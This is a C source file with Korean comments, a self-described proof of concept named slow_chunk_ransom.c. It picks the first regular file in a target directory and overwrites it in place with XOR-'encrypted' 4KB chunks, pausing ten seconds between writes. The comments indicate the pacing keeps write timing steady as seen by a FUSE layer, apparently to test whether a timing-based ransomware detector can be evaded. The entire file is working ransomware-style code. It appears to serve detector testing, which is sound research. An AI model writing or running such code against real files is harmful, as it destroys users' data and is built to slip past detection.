// slow_chunk_ransom.c
// 지정한 디렉터리에서 첫 번째 정규 파일 하나를 골라
// 4KB씩 XOR 암호화하면서, 각 write 사이에 10초씩 쉬는 PoC

#define _XOPEN_SOURCE 700
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <fcntl.h>

#define XOR_KEY   0xAA
#define CHUNK_SIZE 4096      // 4KB
#define INTERVAL_SEC 10      // write 사이 간격 (초)

static int pick_first_regular_file(const char *dir, char *out_path, size_t out_sz) {
    DIR *dp = opendir(dir);
    if (!dp) {
        perror("opendir");
        return -1;
    }

    struct dirent *de;
    struct stat st;
    char path[PATH_MAX];

    while ((de = readdir(dp)) != NULL) {
        if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, ".."))
            continue;

        snprintf(path, sizeof(path), "%s/%s", dir, de->d_name);
        path[PATH_MAX - 1] = '\0';

        if (stat(path, &st) == -1)
            continue;

        if (S_ISREG(st.st_mode) && st.st_size > 0) {
            // 첫 번째 정규 파일 선택
            strncpy(out_path, path, out_sz - 1);
            out_path[out_sz - 1] = '\0';
            closedir(dp);
            return 0;
        }
    }

    closedir(dp);
    return -1; // 정규 파일 없음
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "사용법: %s <공격_대상_디렉터리>\n", argv[0]);
        return 1;
    }

    const char *target_dir = argv[1];
    char victim_path[PATH_MAX];

    if (pick_first_regular_file(target_dir, victim_path, sizeof(victim_path)) == -1) {
        fprintf(stderr, "디렉터리 안에 암호화할 정규 파일이 없습니다: %s\n", target_dir);
        return 1;
    }

    struct stat st;
    if (stat(victim_path, &st) == -1) {
        perror("stat");
        return 1;
    }

    printf("[*] 공격 대상 파일: %s (size=%ld)\n", victim_path, (long)st.st_size);
    printf("[*] %d초마다 %d바이트씩 XOR로 덮어씁니다.\n",
           INTERVAL_SEC, CHUNK_SIZE);

    int fd = open(victim_path, O_RDWR);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    off_t offset = 0;
    char buf[CHUNK_SIZE];

    while (offset < st.st_size) {
        ssize_t to_read = CHUNK_SIZE;
        if (offset + to_read > st.st_size)
            to_read = st.st_size - offset;

        // chunk 읽기
        if (lseek(fd, offset, SEEK_SET) == -1) {
            perror("lseek");
            break;
        }

        ssize_t r = read(fd, buf, to_read);
        if (r != to_read) {
            if (r == -1) perror("read");
            else fprintf(stderr, "read size mismatch: %ld vs %ld\n",
                         (long)r, (long)to_read);
            break;
        }

        // XOR "암호화"
        for (ssize_t i = 0; i < to_read; i++) {
            buf[i] ^= XOR_KEY;
        }

        // 같은 위치에 덮어쓰기(write)
        if (lseek(fd, offset, SEEK_SET) == -1) {
            perror("lseek");
            break;
        }

        ssize_t w = write(fd, buf, to_read);
        if (w != to_read) {
            if (w == -1) perror("write");
            else fprintf(stderr, "write size mismatch: %ld vs %ld\n",
                         (long)w, (long)to_read);
            break;
        }

        printf("[+] offset=%ld, size=%ld 암호화 완료 → %d초 대기\n",
               (long)offset, (long)to_read, INTERVAL_SEC);

        // FUSE 입장에서 이 시점에 "한 번의 write"가 발생
        // → IAT가 거의 INTERVAL_SEC 근처로 일정하게 유지됨
        sleep(INTERVAL_SEC);

        offset += to_read;
    }

    close(fd);
    printf("[*] 파일 전체 처리 완료.\n");
    return 0;
}
